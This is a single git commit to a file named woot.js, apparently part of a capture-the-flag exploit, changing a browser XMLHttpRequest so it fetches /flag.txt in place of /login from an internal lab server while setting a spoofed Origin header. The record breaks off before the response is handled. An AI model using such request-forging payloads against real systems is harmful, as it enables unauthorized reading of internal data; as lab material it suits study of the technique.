9e7de93038841825c533f83cd4a40bb398a3051c
Bernie Lim <limbernie@pm.me>
2018-10-07 04:22:49 +0000

    woot.js

--- woot.js
+++ woot.js
@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://192.168.20.100:8080/login");
+xhr.open("GET", "http://192.168.20.100:8080/flag.txt");
 xhr.setRequestHeader("Origin", "192.168.20.100:8080");
 xhr.onreadystatechange = function () {
 	if (xhr.readyState === 4) {
